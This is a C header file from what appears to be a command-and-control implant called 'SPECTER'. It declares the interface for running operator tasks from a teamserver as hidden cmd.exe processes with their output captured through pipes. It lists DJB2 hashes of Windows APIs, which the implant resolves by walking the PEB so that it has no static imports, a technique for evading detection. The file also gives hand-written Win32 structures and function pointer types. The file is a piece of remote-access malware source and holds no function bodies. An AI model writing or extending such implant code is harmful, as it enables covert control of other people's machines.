/**
 * SPECTER Implant — Task Execution Interface
 *
 * Dispatches tasks received from the teamserver and executes them.
 * Currently supports: TASK_CMD_EXEC (shell command execution via
 * cmd.exe with pipe-captured output).
 *
 * All API resolution via PEB walk + DJB2 hash — no static imports.
 */

#ifndef TASK_EXEC_H
#define TASK_EXEC_H

#include "specter.h"

/* ------------------------------------------------------------------ */
/*  DJB2 hashes for task execution APIs (kernel32.dll)                 */
/* ------------------------------------------------------------------ */

#define HASH_CREATEPROCESSA     0x9EF6FE79  /* "CreateProcessA"      */
#define HASH_CREATEPIPE         0x1BF19F27  /* "CreatePipe"          */
#define HASH_READFILE           0xF94DC161  /* "ReadFile"            */
#define HASH_CLOSEHANDLE        0x2EAC8647  /* "CloseHandle"         */
#define HASH_WAITFORSINGLEOBJ   0xDA18E23A  /* "WaitForSingleObject" */
#define HASH_GETEXITCODEPROCESS 0x58A06379  /* "GetExitCodeProcess"  */

/* WaitForSingleObject timeout */
#define TASK_WAIT_TIMEOUT_MS    30000       /* 30 second timeout     */

/* ------------------------------------------------------------------ */
/*  Win32 structures for CreateProcess (manual definitions)            */
/* ------------------------------------------------------------------ */

typedef struct _SECURITY_ATTRIBUTES {
    DWORD  nLength;
    PVOID  lpSecurityDescriptor;
    BOOL   bInheritHandle;
} SECURITY_ATTRIBUTES;

typedef struct _STARTUPINFOA {
    DWORD  cb;
    char  *lpReserved;
    char  *lpDesktop;
    char  *lpTitle;
    DWORD  dwX;
    DWORD  dwY;
    DWORD  dwXSize;
    DWORD  dwYSize;
    DWORD  dwXCountChars;
    DWORD  dwYCountChars;
    DWORD  dwFillAttribute;
    DWORD  dwFlags;
    WORD   wShowWindow;
    WORD   cbReserved2;
    PBYTE  lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
} STARTUPINFOA;

typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD  dwProcessId;
    DWORD  dwThreadId;
} PROCESS_INFORMATION;

/* STARTUPINFOA flags */
#define STARTF_USESTDHANDLES    0x00000100
#define STARTF_USESHOWWINDOW    0x00000001

/* CreateProcess flags */
#define CREATE_NO_WINDOW        0x08000000

/* WaitForSingleObject return values */
#define WAIT_OBJECT_0           0x00000000
#define WAIT_TIMEOUT_VAL        0x00000102
#define WAIT_FAILED_VAL         0xFFFFFFFF

/* Window show flags */
#define SW_HIDE                 0

/* INFINITE timeout */
#define TASK_INFINITE           0xFFFFFFFF

/* ------------------------------------------------------------------ */
/*  Function pointer types for PEB-resolved APIs                       */
/* ------------------------------------------------------------------ */

typedef BOOL (__attribute__((ms_abi)) *fn_CreateProcessA)(
    const char *lpApplicationName,
    char *lpCommandLine,
    SECURITY_ATTRIBUTES *lpProcessAttributes,
    SECURITY_ATTRIBUTES *lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    PVOID lpEnvironment,
    const char *lpCurrentDirectory,
    STARTUPINFOA *lpStartupInfo,
    PROCESS_INFORMATION *lpProcessInformation);

typedef BOOL (__attribute__((ms_abi)) *fn_CreatePipe)(
    PHANDLE hReadPipe,
    PHANDLE hWritePipe,
    SECURITY_ATTRIBUTES *lpPipeAttributes,
    DWORD nSize);

typedef BOOL (__attribute__((ms_abi)) *fn_ReadFile)(
    HANDLE hFile,
    PVOID lpBuffer,
    DWORD nNumberOfBytesToRead,
    PDWORD lpNumberOfBytesRead,
    PVOID lpOverlapped);

typedef BOOL (__attribute__((ms_abi)) *fn_CloseHandle)(HANDLE hObject);

typedef DWORD (__attribute__((ms_abi)) *fn_WaitForSingleObject)(
    HANDLE hHandle,
    DWORD dwMilliseconds);

typedef BOOL (__attribute__((ms_abi)) *fn_GetExitCodeProcess)(
    HANDLE hProcess,
    PDWORD lpExitCode);

/* ------------------------------------------------------------------ */
/*  Heap allocation (used by comms.c for result buffers)               */
/* ------------------------------------------------------------------ */

/**
 * Allocate zeroed memory from the process heap via PEB-resolved
 * HeapAlloc. Returns NULL on failure.
 */
PVOID task_alloc(DWORD size);

/**
 * Free memory previously allocated with task_alloc.
 */
void task_free(PVOID ptr);

/* ------------------------------------------------------------------ */
/*  API                                                                */
/* ------------------------------------------------------------------ */

/**
 * Execute a single task. Dispatches based on task->task_type.
 * Results are stored in ctx->task_results[].
 */
void execute_task(IMPLANT_CONTEXT *ctx, TASK *task);

/**
 * Parse a task_type string from TLV into a DWORD task type constant.
 * Returns TASK_TYPE_CMD, TASK_TYPE_MODULE, etc., or 0 for unknown.
 */
DWORD parse_task_type(const char *type_str, DWORD len);

/**
 * Free dynamically allocated task data buffers.
 * Called after tasks have been executed and results collected.
 */
void task_free_pending(IMPLANT_CONTEXT *ctx);

/**
 * Free dynamically allocated task result data buffers.
 * Called after results have been sent in the next checkin.
 */
void task_free_results(IMPLANT_CONTEXT *ctx);

#endif /* TASK_EXEC_H */
